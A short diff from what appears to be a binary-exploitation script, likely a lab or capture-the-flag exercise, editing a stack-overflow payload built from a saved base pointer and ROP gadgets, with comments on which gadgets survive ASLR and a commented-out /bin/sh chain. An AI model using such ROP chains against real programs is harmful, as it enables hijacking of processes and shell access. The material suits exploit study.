@@ -59,9 +59,6 @@ double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
 payload = (
     buffer
     + backup_base_pointer
-    + double_pop_ret
-    + rop_puts  # works with aslr.
-    + rop_puts  # works with aslr.
     + rop_puts  # works with aslr.
     # + rop_pop_rdi_ret  # works with aslr.
     # + bin_sh_string  # broken by aslr.
